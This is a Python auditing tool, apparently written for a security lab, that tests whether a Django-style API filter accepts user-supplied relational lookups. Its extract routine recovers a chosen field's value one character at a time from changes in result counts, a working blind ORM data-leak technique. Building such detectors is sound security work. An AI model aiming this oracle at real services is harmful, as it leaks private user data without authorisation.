# -*- coding: utf-8 -*-
"""Boolean ORM-leak oracle. Proves a filter accepts relational lookups.

Does not walk password hashes. A canary field is extracted only when the
caller names the field and an alphabet.
"""

from __future__ import annotations

import string
from typing import Any, Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, urlunparse

import requests

_RELATIONAL = 'created_by__user__username'
_INVALID = 'not_a_real_field'
_MAX_CANARY = 32


def _join(base: str, path: str) -> str:
    parsed = urlparse(base)
    return urlunparse(parsed._replace(path=path))


def normalize_target(url: str) -> str:
    """Base lab URL (no path) maps to the vulnerable articles sink."""
    parsed = urlparse(url.strip())
    path = parsed.path or ''
    if path in ('', '/'):
        path = '/api/articles/'
    return urlunparse(parsed._replace(path=path))


def safe_sibling(url: str) -> Optional[str]:
    path = urlparse(url).path.rstrip('/')
    if path.endswith('/safe'):
        return None
    if path.endswith('/articles'):
        return _join(url, path + '/safe/')
    return None


def _is_safe_target(url: str) -> bool:
    return urlparse(url).path.rstrip('/').endswith('/safe')


class OrmakAuditor:
    def __init__(self, handler: Dict[str, Any]):
        self.handler = handler
        self.timeout = int(handler.get('timeout') or 10)
        self.session = requests.Session()

    def _once(self, url: str, payload: Dict[str, Any]) -> Optional[requests.Response]:
        try:
            return self.session.post(
                url,
                json=payload,
                timeout=self.timeout,
                allow_redirects=False,
            )
        except requests.RequestException:
            return None

    def post(self, url: str, payload: Dict[str, Any]) -> Tuple[Optional[requests.Response], str]:
        """POST without letting the client turn a redirect into GET.

        Django rejects a POST that is missing the trailing slash with 500
        (APPEND_SLASH cannot keep the body). Retry that URL with a slash,
        and re-POST once if the server sends a 30x Location.
        """
        response = self._once(url, payload)
        if response is not None and response.status_code in (301, 302, 307, 308):
            location = response.headers.get('Location')
            if location:
                target = urljoin(url, location)
                retry = self._once(target, payload)
                if retry is not None:
                    return retry, target

        parsed = urlparse(url)
        if parsed.path and not parsed.path.endswith('/'):
            if response is None or response.status_code >= 400:
                slashed = urlunparse(parsed._replace(path=parsed.path + '/'))
                retry = self._once(slashed, payload)
                if retry is not None and retry.status_code < 400:
                    return retry, slashed
        return response, url

    def count(self, url: str, payload: Dict[str, Any]) -> Tuple[Optional[int], str]:
        response, final = self.post(url, payload)
        if response is None or response.status_code >= 400:
            return None, final
        try:
            body = response.json()
        except ValueError:
            return None, final
        if isinstance(body, list):
            return len(body), final
        return None, final

    def _letter_hit(self, url: str, field: str) -> Optional[Tuple[str, int]]:
        for char in string.ascii_lowercase:
            count, _ = self.count(url, {f'{field}__startswith': char})
            if count:
                return char, count
        return None

    def _case_insensitive(self, url: str, field: str, sample: str) -> bool:
        if not sample or not sample.isalpha():
            return False
        upper = sample.upper()
        if upper == sample:
            return False
        upper_count, _ = self.count(url, {f'{field}__startswith': upper})
        return bool(upper_count)

    def extract(self, url: str, field: str, alphabet: str) -> Dict[str, Any]:
        leaked = ''
        case_insensitive = False
        checked_case = False
        for _ in range(_MAX_CANARY):
            found = ''
            for char in alphabet:
                count, _ = self.count(url, {f'{field}__startswith': leaked + char})
                if count:
                    found = char
                    break
            if not found:
                break
            if not checked_case:
                case_insensitive = self._case_insensitive(url, field, found)
                checked_case = True
            leaked += found
        return {
            'field': field,
            'recovered': leaked,
            'case_insensitive': case_insensitive,
            'exact': bool(leaked) and not case_insensitive,
        }

    def audit_url(self, url: str) -> Dict[str, Any]:
        baseline, final = self.count(url, {})
        invalid, final = self.count(final, {_INVALID: 'x'})
        hit = self._letter_hit(final, _RELATIONAL)
        relational_count = hit[1] if hit else 0
        lookup = f'{_RELATIONAL}__startswith'
        accepted = (
            baseline is not None
            and invalid == 0
            and relational_count > 0
            and relational_count != baseline
        )
        return {
            'endpoint': final,
            'lookup': lookup,
            'baseline_count': baseline,
            'invalid_count': invalid,
            'relational_count': relational_count,
            'accepted': accepted,
        }


def run_audit(handler: Dict[str, Any]) -> Dict[str, Any]:
    raw = (handler.get('target_url') or '').strip()
    if not raw:
        return {'ok': False, 'error': 'target_url is required', 'vulnerable': False}

    auditor = OrmakAuditor(handler)
    target = normalize_target(raw)
    main = auditor.audit_url(target)

    safe_url = (handler.get('orm_safe_url') or '').strip()
    if not safe_url and not _is_safe_target(main['endpoint']):
        sibling = safe_sibling(main['endpoint'])
        if sibling:
            probe, _ = auditor.count(sibling, {})
            if probe is not None:
                safe_url = sibling

    safe_report = None
    if safe_url and not _is_safe_target(main['endpoint']):
        safe = auditor.audit_url(normalize_target(safe_url) if urlparse(safe_url).path in ('', '/') else safe_url)
        safe_report = {
            'endpoint': safe['endpoint'],
            'relational_count': safe['relational_count'],
            'rejects': not safe['accepted'],
        }

    if _is_safe_target(main['endpoint']):
        vulnerable = False
    elif safe_report is not None:
        vulnerable = bool(main['accepted'] and safe_report['rejects'])
    else:
        vulnerable = bool(main['accepted'])

    canary = None
    field = handler.get('orm_canary_field') or ''
    if field and not _is_safe_target(main['endpoint']) and main['accepted']:
        alphabet = handler.get('orm_canary_alphabet') or string.ascii_lowercase
        canary = auditor.extract(main['endpoint'], str(field), str(alphabet))

    return {
        'ok': main['baseline_count'] is not None,
        'vulnerable': vulnerable,
        'endpoint': main['endpoint'],
        'lookup': main['lookup'],
        'baseline_count': main['baseline_count'],
        'invalid_count': main['invalid_count'],
        'relational_count': main['relational_count'],
        'safe': safe_report,
        'canary': canary,
        'cwe': 'CWE-200',
    }
